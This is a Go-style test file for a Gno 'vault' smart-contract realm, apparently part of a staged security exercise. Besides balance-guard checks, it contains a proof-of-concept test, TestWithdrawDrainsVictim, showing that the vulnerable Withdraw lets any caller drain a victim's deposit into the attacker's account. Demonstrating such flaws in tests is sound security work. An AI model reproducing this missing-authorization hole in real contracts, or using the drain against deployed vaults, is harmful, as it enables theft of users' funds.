package vault

import (
	"testing"

	"chain"
	"chain/banker"
)

const (
	victimAddr   = "g1ssyj4q3mlj4z8v0hfyauvkj6m97m7n2vem793m"
	attackerAddr = "g1llc3lq3zmjtjdk29dk52munrzxt5ne746cl7r8"
)

const testVaultPkgPath = "gno.land/r/g1ssyj4q3mlj4z8v0hfyauvkj6m97m7n2vem793m/vault"

// mustPanic runs fn and fails the test unless fn panics.
func mustPanic(t *testing.T, name string, fn func()) {
	t.Helper()
	panicked := false
	func() {
		defer func() {
			if recover() != nil {
				panicked = true
			}
		}()
		fn()
	}()
	if !panicked {
		t.Fatalf("%s: expected panic, got none", name)
	}
}

func TestBalanceOfZeroForUnknown(t *testing.T) {
	if got := BalanceOf(victimAddr); got != 0 {
		t.Fatalf("BalanceOf unknown = %d, want 0", got)
	}
}

func TestWithdrawInsufficientPanics(cur realm, t *testing.T) {
	// Seed a victim balance directly: the unit test only proves the
	// balance guard. The actual coin drain is proven in gnodev
	// (scripts/local-flow.sh, day 7), where real bank balances exist.
	// NOTE: Withdraw is called WITHOUT cross(cur) on purpose. A panic
	// from a crossing call becomes an abort at the realm boundary and
	// is not catchable by recover(); a direct call in the same realm
	// keeps the panic local and recoverable.
	deposits[victimAddr] = 100
	mustPanic(t, "Withdraw above balance", func() {
		Withdraw(cur, victimAddr, 101)
	})
	if got := BalanceOf(victimAddr); got != 100 {
		t.Fatalf("failed Withdraw changed balance to %d, want 100", got)
	}
	mustPanic(t, "Withdraw zero amount", func() {
		Withdraw(cur, victimAddr, 0)
	})
	mustPanic(t, "Withdraw negative amount", func() {
		Withdraw(cur, victimAddr, -5)
	})
}

// TestWithdrawDrainsVictim is the day-7 PoC (design §9.2 step 2): on
// the VULNERABLE vault, anyone may call Withdraw(victim, amount) and
// the coins go to the CALLER. The victim's recorded balance drops to
// 0, the attacker's real bank balance grows by the full 5 GNOT, and
// the vault's bank balance drops to 0. The same drain is proven with
// real gnodev balances in scripts/local-flow.sh.
func TestWithdrawDrainsVictim(cur realm, t *testing.T) {
	deposits = make(map[address]int64)
	victim := address(victimAddr)
	attacker := address(attackerAddr)
	realmAddr := chain.PackageAddress(testVaultPkgPath)
	deposits[victim] = 5000000
	testing.IssueCoins(realmAddr, chain.Coins{{Denom: "ugnot", Amount: 5000000}})
	testing.SetRealm(testing.NewUserRealm(attacker))
	Withdraw(cross(cur), victim, 5000000)
	if got := BalanceOf(victim); got != 0 {
		t.Fatalf("BalanceOf(victim) after attacker Withdraw = %d, want 0", got)
	}
	bank := banker.NewReadonlyBanker()
	if got := bank.GetCoin(attacker, "ugnot"); got != 5000000 {
		t.Fatalf("attacker bank balance = %d, want 5000000", got)
	}
	if got := bank.GetCoin(realmAddr, "ugnot"); got != 0 {
		t.Fatalf("vault bank balance = %d, want 0", got)
	}
}
